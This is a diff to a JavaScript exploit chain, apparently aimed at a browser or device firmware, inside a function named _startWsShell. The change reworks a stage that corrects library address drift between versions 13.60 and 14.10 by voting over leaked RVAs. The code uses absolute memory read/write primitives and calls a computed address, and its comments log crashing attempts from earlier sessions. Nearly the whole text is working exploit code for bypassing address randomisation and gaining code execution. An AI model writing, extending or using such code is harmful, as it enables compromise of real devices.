@@ -5251,41 +5251,36 @@ function _startWsShell(){
           }
         }
         if(lkBase===null){reply.log=elog;reply.err='no candidate confirmed';break;}
-        /* ---- stage 5 (v7): THE DELTA-FINGERPRINT DRIFT ----
-         * Session 25: canary CONFIRMED the base, then the gettimeofday call
-         * at lk+0x1B840 (the 13.60 wrapper RVA) CRASHED - the TEXT layout
-         * drifted 13.60->14.10 (the data offsets did NOT: the canary at
-         * +0x751D0 was exact). The drift Delta is MEASURABLE from the
-         * harvest: the pthread-family RVAs (create 0x21890, exit 0x21C20,
-         * join 0x229A0, sleep 0x27F00) have UNIQUE pairwise deltas
-         * (0x390, 0xDD0, 0x5560, 0x1110, 0x62E0, 0x6650) - drift-invariant
-         * fingerprints. Any harvested pair matching a delta yields a Delta
-         * hypothesis; the consensus wins; the TRUE gettimeofday wrapper =
-         * lk + 0x1B840 + Delta. */
-        var PD={c:0x21890n,e:0x21C20n,j:0x229A0n,s:0x27F00n};
-        var PAIRS=[{d:0x390n,lo:'c',hi:'e'},{d:0xDD0n,lo:'e',hi:'j'},{d:0x5560n,lo:'j',hi:'s'},{d:0x1110n,lo:'c',hi:'j'},{d:0x62E0n,lo:'e',hi:'s'},{d:0x6650n,lo:'c',hi:'s'}];
+        /* ---- stage 5 (v8): THE DRIFT VOTE ----
+         * Sessions 25/26: canary CONFIRMED the base twice; the uncorrected
+         * gettimeofday call at lk+0x1B840 (the 13.60 RVA) crashed both
+         * times - the TEXT drifted 13.60->14.10 (the data did NOT: the
+         * canary at +0x751D0 exact twice). The pthread pair-delta
+         * fingerprint found no pairs (the WK module imports single family
+         * members only). v8: with the base already confirmed, EVERY
+         * cluster member's true RVA minus ITS OWN 13.60 RVA (if imported
+         * and in the table) equals the SAME drift Delta - the true Delta
+         * collects votes from ~8-15 imported functions across the full
+         * 339-RVA table, drowning the noise. The cluster RVAs are banked
+         * on sync beacons first - the data survives any death. */
         var lkvals=[];
         for(var lk1=0;lk1<vals.length;lk1++){var v1=vals[lk1];if(v1>=lkBase&&v1<lkBase+0xC00000n)lkvals.push(v1);}
         ELs('lk-cluster n='+lkvals.length);
+        for(var lbk=0;lbk<lkvals.length&&lbk<40;lbk++)ELs('rva['+lbk+']=0x'+(lkvals[lbk]-lkBase).toString(16));
         var dvotes={};
         for(var la=0;la<lkvals.length;la++){
-          for(var lb=0;lb<lkvals.length;lb++){
-            var dlt=lkvals[lb]-lkvals[la];
-            for(var lp=0;lp<PAIRS.length;lp++){
-              if(dlt===PAIRS[lp].d){
-                var hyp=lkvals[la]-lkBase-PD[PAIRS[lp].lo];
-                if(hyp<0n)continue;
-                var hk=hyp.toString(16);
-                dvotes[hk]=(dvotes[hk]||0)+1;
-                ELs('delta-pair d=0x'+dlt.toString(16)+' -> Delta=0x'+hk);
-              }
-            }
+          var rva_a=lkvals[la]-lkBase;
+          for(var ri2=0;ri2<E2_RVAS.length;ri2++){
+            var dlt=rva_a-BigInt(E2_RVAS[ri2]);
+            if(dlt<0n||dlt>0x100000n)continue;
+            var hk=dlt.toString(16);
+            dvotes[hk]=(dvotes[hk]||0)+1;
           }
         }
         var dlist=Object.keys(dvotes).map(function(k){return{D:BigInt('0x'+k),n:dvotes[k]};});
         dlist.sort(function(a,b){return b.n-a.n;});
-        ELs('drift candidates: '+dlist.slice(0,4).map(function(x){return '0x'+x.D.toString(16)+'(x'+x.n+')';}).join(','));
-        if(dlist.length&&dlist[0].n>=1){
+        ELs('drift votes: '+dlist.slice(0,5).map(function(x){return '0x'+x.D.toString(16)+'(x'+x.n+')';}).join(','));
+        if(dlist.length&&dlist[0].n>=2){
           var driftD=dlist[0].D;
           ELs('WITNESS at lk+0x1B840+0x'+driftD.toString(16)+' = 0x'+(lkBase+0x1B840n+driftD).toString(16));
           for(var zi2=0;zi2<4;zi2++)S.absWrite(S.fakeScope+BigInt(zi2*8),0n);
@@ -5294,7 +5289,7 @@ function _startWsShell(){
           ELs('tv2=0x'+tv2.toString(16)+' 0x'+tv3.toString(16));
           if(tv2>0x40000000n&&tv2<0x80000000n&&tv3<0xF4240n){reply.tv2='0x'+tv2.toString(16);ELs('E2 WITNESS VIA DRIFT-CORRECTED WRAPPER');}
         }else{
-          ELs('no drift pair measured - last resort: uncorrected wrapper');
+          ELs('no drift consensus (need 2+ votes) - last resort: uncorrected wrapper');
           for(var zi3=0;zi3<4;zi3++)S.absWrite(S.fakeScope+BigInt(zi3*8),0n);
           e2callRaw(lkBase+0x1B840n);
           var tv4=S.absRead(S.fakeScope,8)[0],tv5=S.absRead(S.fakeScope+8n,8)[0];
